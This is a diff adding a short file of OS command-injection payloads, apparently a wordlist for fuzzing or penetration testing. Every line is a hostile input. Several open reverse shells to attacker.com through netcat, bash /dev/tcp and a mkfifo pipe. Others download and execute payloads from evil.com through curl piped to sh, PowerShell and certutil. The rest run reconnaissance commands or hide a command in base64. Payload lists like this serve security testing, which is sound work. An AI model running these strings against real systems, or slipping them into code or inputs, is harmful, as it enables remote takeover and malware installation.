@@ -1,0 +1,13 @@
+; ls -al
+| whoami
+& ping -c 4 attacker.com
+|| dir C:\
+; curl http://evil.com/shell.sh | sh
+$(id)
+`id`
+; nc -e /bin/sh attacker.com 4444
+; bash -c 'exec bash -i &>/dev/tcp/attacker.com/4444 <&1'
+; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f
+| powershell -c "Invoke-WebRequest http://evil.com/shell.exe -OutFile C:\shell.exe; Start-Process C:\shell.exe"
+& certutil.exe -urlcache -split -f http://evil.com/shell.exe C:\shell.exe
+; $(echo "bHMK" | base64 -d)  # Decodes to "ls"
